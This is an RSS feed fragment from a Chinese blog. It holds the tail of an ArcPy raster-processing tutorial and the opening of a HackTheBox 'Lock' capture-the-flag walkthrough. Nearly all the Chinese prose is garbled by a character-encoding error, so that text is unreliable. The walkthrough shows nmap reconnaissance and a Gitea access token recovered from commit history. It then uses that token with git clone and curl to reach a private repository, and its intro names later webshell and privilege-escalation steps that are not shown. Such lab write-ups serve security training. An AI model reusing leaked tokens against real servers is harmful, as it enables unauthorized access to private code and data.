    try:
        # Step 1: ééæ ·
        print("   â¤ æ­¥éª¤ 1ï¼ééæ ·è³ 30m...")
        resampled = arcpy.sa.Resample(tif_path, cellsize_degree, "BILINEAR")
       
        # Step 2: è£åª
        print("   â¤ æ­¥éª¤ 2ï¼æç¢éè£åª...")
        clipped = arcpy.sa.ExtractByMask(resampled, mask_shp)
       
        # Step 3: ä¿å­ç»æ
        print("   ð¾ æ­¥éª¤ 3ï¼ä¿å­è¾åº...")
        out_name = f"{variable_name}_{year}_{os.path.splitext(filename)[0]}.tif"
        out_path = os.path.join(output_folder, out_name)
        arcpy.management.CopyRaster(clipped, out_path, pixel_type="32_BIT_FLOAT")
        print(f"   â å®æï¼{out_name}\n")
    except Exception as e:
        print(f"   â å¤çå¤±è´¥ï¼{e}\n")
        continue

print("ð ææä»»å¡å·²å®æï¼")
</code></pre>
</li>
<li>
<p><strong>æ§è¡å½ä»¤</strong>ï¼<br>
ä¸ºä»ä¹ï¼è¿æ¯âç¹ç«å¯å¨âï¼è®©èæ¬å¼å§æ«æåå¤çæä»¶ã</p>
<ul>
<li>æå¼ArcGIS Python Command Promptï¼å¯¼èªå°èæ¬ç®å½ï¼è¾å¥ <code>cd ãyour_script_pathã</code>ï¼ä¾å¦ <code>cd C:\Scripts</code>ï¼ã</li>
<li>è¿è¡å½ä»¤ï¼<strong><code>python batch_raster_process.py</code></strong>ã</li>
<li>èå¿ç­å¾ï¼å¤§æä»¶å¯è½éå åéï¼ï¼ç»ç«¯ä¼æ¾ç¤ºè¿åº¦æ¡åå®ææç¤ºã</li>
</ul>
</li>
<li>
<p><strong>éªè¯ç»æ</strong>ï¼<br>
ä¸ºä»ä¹ï¼åè¯ç©¿è¡£æï¼ç¡®ä¿âåªè£âååèº«æ è¯¯ã</p>
<ul>
<li>æå¼è¾åºæä»¶å¤¹ï¼æ£æ¥æ¯å¦çæä»¥å¹´ä»½å½åçTIFæä»¶ï¼å¦ <code>kuangshan4_2020_xxx.tif</code>ï¼ã</li>
<li>å¨ArcGISä¸­æ·»å ä¸ä¸ªè¾åºTIFï¼æ¥çå¾å±å±æ§ï¼åè¾¨çåºä¸º30mï¼è¾¹çå¹éSHPèå´ã</li>
<li>å¦ææä»¶æ°ä¸è¾å¥å¹éï¼ä¸æ éè¯¯æç¤ºï¼å³å¤§ååæã</li>
</ul>
</li>
</ol>
<h2 id="æ ¸å¿ä»£ç è§£æ">æ ¸å¿ä»£ç è§£æ</h2>
<p>èæ¬åä¸ä¸ªâæµæ°´çº¿å·¥åâï¼åâæ¸ç¹è´§ç©âï¼æ¾TIFæä»¶ï¼ï¼ç¶åå¯¹æ¯ä¸ªâé¶ä»¶âèµ°ä¸éå·¥åºï¼ééæ ·ãè£åªãæåï¼ï¼åºéå°±âéç¦»âä¸å½±åæ´ä½ãç¨å¤§ç½è¯èæ ¸å¿é»è¾ï¼å°±å¦ç»è£ç©å·è½¦ââç®åå æ­¥ï¼æåå°±è·èµ·æ¥äºã</p>
<ul>
<li>
<p><strong>æç´¢TIFæä»¶</strong>ï¼<code>tif_list = glob.glob(...)</code>ï¼ï¼<br>
è¿è¡åâä»åºç®¡çåâæ¿çæçµç­ï¼å¨ä¸»æä»¶å¤¹åå¶å­æä»¶å¤¹ï¼æå¹´ä»½åï¼éæç½ææâ.tifâè´§åï¼åä¸ªæ¸åãä¸ºä»ä¹ï¼æ¹éå¤çåå¾ç¥éâæå¤å°æ´»å¿âï¼é¿åæ¼ææä»¶ã</p>
</li>
<li>
<p><strong>æåå¹´ä»½</strong>ï¼<code>year_match = re.search(r"\d{4}", parent_folder)</code>ï¼ï¼<br>
æ³è±¡æâæ ç­¾éè¯»å¨âï¼ä»æä»¶å¤¹åï¼å¦â2020_dataâï¼ä¸­æ åºâ2020âè¿ä¸ªæ°å­ï¼å½ä½æä»¶åæ ç­¾ãä¸ºä»ä¹ï¼è¿æ ·è¾åºæä»¶å¸¦å¹´ä»½ï¼ä¾¿äºåæææ¶é´æåºåæã</p>
</li>
<li>
<p><strong>ééæ ·</strong>ï¼<code>resampled = arcpy.sa.Resample(...)</code>ï¼ï¼<br>
åâæ¾å¤§éè°æ´å¨âï¼æåTIFâæä¼¸âæâåç¼©âå°30ç±³åç´ å¤§å°ï¼ç¨âBILINEARâæ¹å¼å¹³æ»è¿æ¸¡ï¼åé»å±å¹³åå¼ï¼é¿åé¯é½¿ï¼ãä¸ºä»ä¹ï¼ç»ä¸åè¾¨çï¼è®©ä¸åæ¥æºçæ°æ®âç«é½éâã</p>
</li>
<li>
<p><strong>è£åª</strong>ï¼<code>clipped = arcpy.sa.ExtractByMask(...)</code>ï¼ï¼<br>
è¿æ­¥å¦âåªåæâï¼ç¨SHPè¾¹çå½âæ¨¡æ¿âï¼åªåä¸ç ç©¶åºåçé¨åï¼ææå¤å´âåºæâãä¸ºä»ä¹ï¼èç¦æå´è¶£åºåï¼èçå­å¨åè®¡ç®æ¶é´ã</p>
</li>
<li>
<p><strong>ä¿å­ç»æ</strong>ï¼<code>arcpy.management.CopyRaster(...)</code>ï¼ï¼<br>
åâæåæºâï¼ç»æä»¶èµ·åï¼åé+å¹´ä»½+ååï¼ï¼å­ä¸ºæµ®ç¹TIFï¼ç¡®ä¿æ°æ®ç²¾åº¦ä¸ä¸¢ãä¸ºä»ä¹ï¼æµ®ç¹æ ¼å¼ä¿ææ°å¼åç¡®ï¼éåæ²éç­è¿ç»­æ°æ®ã</p>
</li>
</ul>
<p>æ´ä¸ªæµç¨å¾ªç¯éåæ¸åï¼try-exceptåâå®å¨ç½âï¼ä¸ä¸ªåäºä¸è½è¯¯å«äººãæ°ææäºï¼å°±è½æ¹æå æå½±æç»è®¡åè½ã</p>
<h2 id="å¸¸è§é®é¢è§£å³">å¸¸è§é®é¢è§£å³</h2>
<p>è·èæ¬æ¶ï¼æ°æå¸¸éå°åå·ï¼ä½è¿äºæ¯âç»éªè¯æ¹âï¼æåç¥éå°±è½å°èµ°å¼¯è·¯ãä¸ºä»ä¹ååºæ¥ï¼å ä¸ºè°è¯åæ¾é¥åï¼ç¥éå¸¸è§èå¤æ´å¿«å¼é¨ã</p>
<ul>
<li>
<p><strong>è·¯å¾éè¯¯</strong>ï¼</p>
<ul>
<li>æ¥éå¦âNo such file or directoryâã</li>
<li>è§£å³ï¼ç¨ <code>r"è·¯å¾"</code>ï¼rawå­ç¬¦ä¸²ï¼ï¼åæ£æ¥è¾å¥/è¾åºæä»¶å¤¹å­å¨ãç¨æä»¶èµæºç®¡çå¨å¤å¶å®æ´è·¯å¾ç²è´´ãä¸ºä»ä¹ï¼è·¯å¾ææï¼åç¹ææ éå°±æ¾ä¸å°å®¶ã</li>
</ul>
</li>
<li>
<p><strong>æ©å±æªææ</strong>ï¼</p>
<ul>
<li>æ¥éâCheckOutExtension failedâã</li>
<li>è§£å³ï¼å¨ArcGISè®¸å¯ç®¡çå¨ä¸­å¯ç¨Spatial Analystï¼éå¯è½¯ä»¶ãä¸ºä»ä¹ï¼æ©å±åVIPé¨ç¥¨ï¼æ²¡å®è¿ä¸äºæ æ ¼å·¥åã</li>
</ul>
</li>
<li>
<p><strong>åè¾¨çä¼°ç®ä¸å</strong>ï¼</p>
<ul>
<li>è¾åºå¾ååå½¢æåæ éã</li>
<li>è§£å³ï¼å¦æä½ çTIFæ¯æå½±åæ ï¼æ¹ <code>cellsize_degree</code> ä¸ºå®éç±³å¼ï¼å¦ç´æ¥ç¨ <code>cell_size</code>ï¼ãæµè¯å°æä»¶åè·ãä¸ºä»ä¹ï¼åº¦åæ ä¸ç±³éè½¬æ¢ï¼æå½±åæ ç´æ¥ç¨ç±³æ´åã</li>
</ul>
</li>
<li>
<p><strong>åå­ä¸è¶³æå¤çæ¢</strong>ï¼</p>
<ul>
<li>å¤§æä»¶å¡æ­»ææ¥âOut of memoryâã</li>
<li>è§£å³ï¼å³æå¶ä»ç¨åºï¼å¤çååæ¹å°æä»¶å¤¹ï¼æå  <code>arcpy.env.workspace = output_folder</code> ä¼åãä¸ºä»ä¹ï¼æ æ ¼å¤çååå­ï¼åå¤§éç®é¥­ï¼éå°å°±åæ¬¡ã</li>
</ul>
</li>
<li>
<p><strong>å¶ä»</strong>ï¼TIFæ å¹´ä»½æä»¶å¤¹æ¶ï¼è¾åºåå¸¦âunknownâââæå¨è°æ´æä»¶å¤¹ç»æãåºéæ¶ï¼å¤å¶ç»ç«¯éè¯¯GoogleâArcPy [éè¯¯] Resampleâã</p>
</li>
</ul>
<p>ææ¡è¿äºï¼èæ¬å°±æ¯ä½ çå¾åå©æãè¯è·åï¼æ¬¢è¿åäº«ä½ çGISå°é¡¹ç®ï¼</p>


</div>
<div class="clear"></div>

	<div class="postDesc">posted on 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-02-15 18:20">2026-02-15 18:19</span>&nbsp;
<a href="https://www.cnblogs.com/Laurentianelle">Laurentianelle</a>&nbsp;
éè¯»(<span id="post_view_count">22</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19618450);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19618450', targetLink: 'https://www.cnblogs.com/Laurentianelle/p/19618450', title: 'ä½¿ç¨ ArcPy æ¹éå¤çæ æ ¼æ°æ®ï¼ééæ ·ä¸ç¢éè£åª' })">ä¸¾æ¥</a>
</div>
 ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ ãæ¸éæµè¯ãHTBé¶åºä¹Lock å¨è¿ç¨wp ]]></title>
    <link>https://www.cnblogs.com/DSchenzi/p/19618342</link>
    <guid>81ffb95fa140aa9af08f78359ddfbb6e</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/DSchenzi/p/19618342" title="åå¸äº 2026-02-15 17:05">
    <span role="heading" aria-level="2">ãæ¸éæµè¯ãHTBé¶åºä¹Lock å¨è¿ç¨wp</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h1 id="lock">Lock</h1>
<p><strong>Lock</strong> æ¯ä¸å°ç®åé¾åº¦ç Windows é¶æºãè§£é¢æµç¨åæ¬ï¼æä¸¾ Gitea ä»åºæ¾å°ä¸ªäººè®¿é®ä»¤çï¼PATï¼ï¼å©ç¨è¯¥ä»¤çå¨æå¡å¨ä¸é¨ç½² ASPX ç½é¡µåé¨ï¼ä»èè·å¾åå§ç«è¶³ç¹ï¼ä» mRemoteNG éç½®æä»¶ä¸­è§£å¯åºå¯ç ï¼å¾å°æ°ç¨æ·è´¦æ·çç»å½æéï¼æåå©ç¨ PDF24 ç¨åºä¸­çæ¬å°æææ¼æ´ï¼è·å SYSTEM æéç Shellã</p>
<h2 id="ä¿¡æ¯æ¶é">ä¿¡æ¯æ¶é</h2>
<p>ç®æ ip:10.129.234.64</p>
<p>kali ip:10.10.16.4</p>
<pre><code class="language-kotlin">âââ(rootã¿kali)-[~/æ¡é¢/HTB]
ââ# nmap -A -T4 10.129.234.64          
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-15 01:34 EST
Nmap scan report for 10.129.234.64
Host is up (0.30s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Lock - Index
| http-methods: 
|_  Potentially risky methods: TRACE
445/tcp  open  microsoft-ds?
3000/tcp open  http          Golang net/http server
|_http-title: Gitea: Git with a cup of tea
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Content-Type: text/html; charset=utf-8
|     Set-Cookie: i_like_gitea=74301fab8c80b509; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=7YhSALV0ZBSIvHetLhey94Wp5Es6MTc3MTEzNzQyMDEwNTU1NjcwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Sun, 15 Feb 2026 06:37:00 GMT
|     &lt;!DOCTYPE html&gt;
|     &lt;html lang="en-US" class="theme-auto"&gt;
|     &lt;head&gt;
|     &lt;meta name="viewport" content="width=device-width, initial-scale=1"&gt;
|     &lt;title&gt;Gitea: Git with a cup of tea&lt;/title&gt;
|     &lt;link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2xvY2FsaG9zdDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwOi8vbG9jYWxob3N0OjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLCJzaXplcyI6IjU
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Allow: HEAD
|     Allow: GET
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Set-Cookie: i_like_gitea=c9a200de20c43a71; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=_WL4mnt6F0jUe2zby5-7FVfiMSY6MTc3MTEzNzQyMTM0NTI4NDgwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Sun, 15 Feb 2026 06:37:01 GMT
|_    Content-Length: 0
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-02-15T06:38:16+00:00; +1m58s from scanner time.
| ssl-cert: Subject: commonName=Lock
| Not valid before: 2026-02-14T06:34:21
|_Not valid after:  2026-08-16T06:34:21
| rdp-ntlm-info: 
|   Target_Name: LOCK
|   NetBIOS_Domain_Name: LOCK
|   NetBIOS_Computer_Name: LOCK
|   DNS_Domain_Name: Lock
|   DNS_Computer_Name: Lock
|   Product_Version: 10.0.20348
|_  System_Time: 2026-02-15T06:37:37+00:00
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.95%I=7%D=2/15%Time=69916916%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(GetRequest,3000,"HTTP/1\.0\x20200\x20OK\r\nCache-Control:
SF:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nConte
SF:nt-Type:\x20text/html;\x20charset=utf-8\r\nSet-Cookie:\x20i_like_gitea=
SF:74301fab8c80b509;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Cookie
SF::\x20_csrf=7YhSALV0ZBSIvHetLhey94Wp5Es6MTc3MTEzNzQyMDEwNTU1NjcwMA;\x20P
SF:ath=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSite=Lax\r\nX-Frame-Option
SF:s:\x20SAMEORIGIN\r\nDate:\x20Sun,\x2015\x20Feb\x202026\x2006:37:00\x20G
SF:MT\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20lang=\"en-US\"\x20class=\"theme-
SF:auto\"&gt;\n&lt;head&gt;\n\t&lt;meta\x20name=\"viewport\"\x20content=\"width=device
SF:-width,\x20initial-scale=1\"&gt;\n\t&lt;title&gt;Gitea:\x20Git\x20with\x20a\x20c
SF:up\x20of\x20tea&lt;/title&gt;\n\t&lt;link\x20rel=\"manifest\"\x20href=\"data:app
SF:lication/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYS
SF:IsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfd
SF:XJsIjoiaHR0cDovL2xvY2FsaG9zdDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwOi8v
SF:bG9jYWxob3N0OjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmc
SF:iLCJzaXplcyI6IjU")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCon
SF:tent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\
SF:r\n400\x20Bad\x20Request")%r(HTTPOptions,197,"HTTP/1\.0\x20405\x20Metho
SF:d\x20Not\x20Allowed\r\nAllow:\x20HEAD\r\nAllow:\x20GET\r\nCache-Control
SF::\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nSet-
SF:Cookie:\x20i_like_gitea=c9a200de20c43a71;\x20Path=/;\x20HttpOnly;\x20Sa
SF:meSite=Lax\r\nSet-Cookie:\x20_csrf=_WL4mnt6F0jUe2zby5-7FVfiMSY6MTc3MTEz
SF:NzQyMTM0NTI4NDgwMA;\x20Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSi
SF:te=Lax\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDate:\x20Sun,\x2015\x20Feb\
SF:x202026\x2006:37:01\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequ
SF:est,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/pla
SF:in;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Reque
SF:st");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-02-15T06:37:38
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 1m57s, deviation: 0s, median: 1m57s

TRACEROUTE (using port 3389/tcp)
HOP RTT       ADDRESS
1   349.42 ms 10.10.16.1
2   349.72 ms 10.129.234.64

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 109.87 seconds
</code></pre>
<p>åç°å¼æ¾äº4ä¸ªç«¯å£ï¼80ã445ã3000ã3389</p>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170442300-1196726848.png" alt="image-20260215144554043" loading="lazy"></p>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170443121-607852831.png" alt="image-20260215144616821" loading="lazy"></p>
<p>å¨å·¦ä¸çæ¢ç´¢ä¸ï¼ä½äºå¬å±ä»åºä¸­æä¸æ®µpythonç¼åçä»£ç </p>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170443642-1647566889.png" alt="image-20260215144932716" loading="lazy"></p>
<pre><code class="language-python">import requests
import sys
import os

def format_domain(domain):
    if not domain.startswith(('http://', 'https://')):
        domain = 'https://' + domain
    return domain

def get_repositories(token, domain):
    headers = {
        'Authorization': f'token {token}'
    }
    url = f'{domain}/api/v1/user/repos'
    response = requests.get(url, headers=headers)

    if response.status_code == 200:
        return response.json()
    else:
        raise Exception(f'Failed to retrieve repositories: {response.status_code}')

def main():
    if len(sys.argv) &lt; 2:
        print("Usage: python script.py &lt;gitea_domain&gt;")
        sys.exit(1)

    gitea_domain = format_domain(sys.argv[1])

    personal_access_token = os.getenv('GITEA_ACCESS_TOKEN')
    if not personal_access_token:
        print("Error: GITEA_ACCESS_TOKEN environment variable not set.")
        sys.exit(1)

    try:
        repos = get_repositories(personal_access_token, gitea_domain)
        print("Repositories:")
        for repo in repos:
            print(f"- {repo['full_name']}")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main()
</code></pre>
<p>è¿æ¯ä¸ä¸ªç¨äºéè¿ Gitea API è·åç¨æ·ä»åºåè¡¨ç Python èæ¬ï¼éè¿ä¸ªäººè®¿é®ä»¤çè¿è¡èº«ä»½éªè¯ã</p>
<p>æ ¸å¿åè½<br>
èº«ä»½éªè¯ï¼ä½¿ç¨ Gitea ä¸ªäººè®¿é®ä»¤ç<br>
API è°ç¨ï¼è°ç¨ Gitea ç /api/v1/user/reposç«¯ç¹<br>
ååå¤çï¼èªå¨æ·»å  HTTPS åè®®åç¼<br>
ä»åºå±ç¤ºï¼è¾åºç¨æ·çææä»åºå®æ´åç§°</p>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170443946-1323051577.png" alt="image-20260215145317851" loading="lazy"></p>
<p>æ¥çæäº¤åå²ï¼å¯ä»¥çå°PERSONAL_ACCESS_TOKEN</p>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170444290-2025630397.png" alt="image-20260215145336211" loading="lazy"></p>
<pre><code class="language-kotlin">PERSONAL_ACCESS_TOKEN = '43ce39bb0bd6bc489284f2905f033ca467a6362f'
</code></pre>
<p>æä»¬å°èæ¬å¤å¶å°kaliéé¢ï¼å¹¶è®¾ç½®ç¯å¢åé</p>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170444621-238580148.png" alt="image-20260215150556841" loading="lazy"></p>
<p>æä»¬å¯ä»¥çå°æä¸¤ä¸ªä»åºï¼dev-scriptsåwebsite</p>
<p>è¿éæä¸¤ä¸ªæ¹æ³</p>
<p><strong>1.git</strong></p>
<p>æä»¬å·²ç»äºè§£äºdev-scriptsï¼æä»¥æ¥ä¸æ¥æä»¬å°åéwebsiteä»åºãä½æ¯ç°å¨æ²¡æå¯ç ï¼åªætokenï¼gitåè®¸tokenå½ä½å¯ç ä½¿ç¨ï¼è¿å¯ä»¥éè¿ä½¿ç¨git cloneå½ä»¤å¹¶åæ¶æä¾è®¿é®ä»¤çæ¥å®æã</p>
<pre><code>git clone https://&lt;username&gt;:&lt;token&gt;@&lt;gitea-domain&gt;/&lt;owner&gt;/&lt;repository&gt;.git

git clone http://43ce39bb0bd6bc489284f2905f033ca467a6362f@10.129.234.64:3000/ellen.freeman/website
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170445070-695726071.png" alt="image-20260215151010801" loading="lazy"></p>
<p><img src="https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170445843-681213167.png" alt="image-20260215151141449" loading="lazy"></p>
<p><strong>2.curl</strong></p>
<pre><code class="language-kotlin">curl http://10.129.234.64:3000/api/v1/user/repos -H "Authorization: Bearer 43ce39bb0bd6bc489284f2905f033ca467a6362f" -s | jq .


[
  {
    "id": 1,
    "owner": {
      "id": 2,
      "login": "ellen.freeman",
      "login_name": "",
      "full_name": "",
      "email": "ellen.freeman@lock.vl",
      "avatar_url": "http://localhost:3000/avatar/1aea7e43e6bb8891439a37854255ed74",
      "language": "",
      "is_admin": false,
      "last_login": "0001-01-01T00:00:00Z",
      "created": "2023-12-27T11:13:10-08:00",
      "restricted": false,
      "active": false,
      "prohibit_login": false,
      "location": "",
      "website": "",
      "description": "",
      "visibility": "public",
      "followers_count": 0,
      "following_count": 0,
      "starred_repos_count": 0,
      "username": "ellen.freeman"
    },
    "name": "dev-scripts",
    "full_name": "ellen.freeman/dev-scripts",
    "description": "",
    "empty": false,
    "private": false,
    "fork": false,
    "template": false,
    "parent": null,
    "mirror": false,
    "size": 29,
    "language": "Python",
    "languages_url": "http://localhost:3000/api/v1/repos/ellen.freeman/dev-scripts/languages",
    "html_url": "http://localhost:3000/ellen.freeman/dev-scripts",
    "url": "http://localhost:3000/api/v1/repos/ellen.freeman/dev-scripts",
    "link": "",
    "ssh_url": "ellen.freeman@localhost:ellen.freeman/dev-scripts.git",
    "clone_url": "http://localhost:3000/ellen.freeman/dev-scripts.git",
    "original_url": "",
    "website": "",
    "stars_count": 0,
    "forks_count": 0,
    "watchers_count": 1,
    "open_issues_count": 0,
    "open_pr_counter": 0,
    "release_counter": 0,
    "default_branch": "main",
    "archived": false,
    "created_at": "2023-12-27T11:17:47-08:00",
    "updated_at": "2023-12-27T11:36:42-08:00",
    "archived_at": "1969-12-31T16:00:00-08:00",
    "permissions": {
      "admin": true,
      "push": true,
      "pull": true
    },
    "has_issues": true,
    "internal_tracker": {
      "enable_time_tracker": true,
      "allow_only_contributors_to_track_time": true,
      "enable_issue_dependencies": true
    },
    "has_wiki": true,
    "has_pull_requests": true,
    "has_projects": true,
    "has_releases": true,
    "has_packages": true,
    "has_actions": false,
    "ignore_whitespace_conflicts": false,
    "allow_merge_commits": true,
    "allow_rebase": true,
    "allow_rebase_explicit": true,
    "allow_squash_merge": true,
    "allow_rebase_update": true,
    "default_delete_branch_after_merge": false,
    "default_merge_style": "merge",
    "default_allow_maintainer_edit": false,
    "avatar_url": "",
    "internal": false,
    "mirror_interval": "",
    "mirror_updated": "0001-01-01T00:00:00Z",
    "repo_transfer": null
  },
  {
    "id": 5,
    "owner": {
      "id": 2,
      "login": "ellen.freeman",
      "login_name": "",
      "full_name": "",
      "email": "ellen.freeman@lock.vl",
      "avatar_url": "http://localhost:3000/avatar/1aea7e43e6bb8891439a37854255ed74",
      "language": "",
      "is_admin": false,
      "last_login": "0001-01-01T00:00:00Z",
      "created": "2023-12-27T11:13:10-08:00",
      "restricted": false,
      "active": false,
      "prohibit_login": false,
      "location": "",
      "website": "",
      "description": "",
      "visibility": "public",
      "followers_count": 0,
      "following_count": 0,
      "starred_repos_count": 0,
      "username": "ellen.freeman"
    },
    "name": "website",
    "full_name": "ellen.freeman/website",
    "description": "",
    "empty": false,
    "private": true,
    "fork": false,
    "template": false,
    "parent": null,
    "mirror": false,
    "size": 7370,
    "language": "CSS",
    "languages_url": "http://localhost:3000/api/v1/repos/ellen.freeman/website/languages",
    "html_url": "http://localhost:3000/ellen.freeman/website",
    "url": "http://localhost:3000/api/v1/repos/ellen.freeman/website",
    "link": "",
    "ssh_url": "ellen.freeman@localhost:ellen.freeman/website.git",
    "clone_url": "http://localhost:3000/ellen.freeman/website.git",
    "original_url": "",
    "website": "",
    "stars_count": 0,
    "forks_count": 0,
    "watchers_count": 1,
    "open_issues_count": 0,
    "open_pr_counter": 0,
    "release_counter": 0,
    "default_branch": "main",
    "archived": false,
    "created_at": "2023-12-27T12:04:52-08:00",
    "updated_at": "2024-01-18T10:17:46-08:00",
    "archived_at": "1969-12-31T16:00:00-08:00",
    "permissions": {
      "admin": true,
      "push": true,
      "pull": true
    },
    "has_issues": true,
    "internal_tracker": {
      "enable_time_tracker": true,
      "allow_only_contributors_to_track_time": true,
      "enable_issue_dependencies": true
    },
    "has_wiki": true,
    "has_pull_requests": true,
    "has_projects": true,
    "has_releases": true,
    "has_packages": true,
    "has_actions": false,
    "ignore_whitespace_conflicts": false,
    "allow_merge_commits": true,
    "allow_rebase": true,
    "allow_rebase_explicit": true,
    "allow_squash_merge": true,
    "allow_rebase_update": true,
    "default_delete_branch_after_merge": false,
    "default_merge_style": "merge",
    "default_allow_maintainer_edit": false,
    "avatar_url": "",
    "internal": false,
    "mirror_interval": "",
    "mirror_updated": "0001-01-01T00:00:00Z",
    "repo_transfer": null
  }
]

</code></pre>
<table>
<thead>
<tr>
<th style="text-align: left">å­æ®µ</th>
<th style="text-align: left">dev-scripts ä»åº</th>
<th style="text-align: left">website ä»åº</th>
<th style="text-align: left">æ¸éæµè¯è§£è¯»</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: left">ä»åº ID</td>
<td style="text-align: left">1</td>
<td style="text-align: left">5</td>
<td style="text-align: left">å¯ä¸æ è¯ï¼API æä½æ¶å¯è½ç¨å°</td>
</tr>
<tr>
<td style="text-align: left">æå±ç¨æ·</td>
<td style="text-align: left">ellen.freeman</td>
<td style="text-align: left">ellen.freeman</td>
<td style="text-align: left">éå®ç®æ ç¨æ·ï¼åç»­å¯å´ç»è¯¥ç¨æ·å±å¼æä¸¾</td>
</tr>
<tr>
<td style="text-align: left">ä»åºå¨åï¼full_nameï¼</td>
<td style="text-align: left">ellen.freeman/dev-scripts</td>
<td style="text-align: left">ellen.freeman/website</td>
<td style="text-align: left">åé / è®¿é®ä»åºçæ ¸å¿æ è¯ï¼æ ¼å¼ä¸ºãç¨æ·å / ä»åºåã</td>
</tr>
<tr>
<td style="text-align: left">ä»åºç±»åï¼privateï¼</td>
<td style="text-align: left">falseï¼å¬å±ï¼</td>
<td style="text-align: left">trueï¼ç§æï¼</td>
<td style="text-align: left"><code>website</code> æ¯ç§æä»åºï¼å¤§æ¦çåå«ææåå®¹ï¼å¦ç½ç«æºç ãé¨ç½²èæ¬ï¼ï¼éç¹å³æ³¨</td>
</tr>
<tr>
<td style="text-align: left">ä¸»è¦å¼åè¯­è¨</td>
<td style="text-align: left">Python</td>
<td style="text-align: left">CSS</td>
<td style="text-align: left">æç¤ºä»åºåå®¹ç±»åï¼- dev-scriptsï¼Python èæ¬- websiteï¼åç«¯ / ç½é¡µä»£ç </td>
</tr>
<tr>
<td style="text-align: left">ä»åºå¤§å°</td>
<td style="text-align: left">29 KB</td>
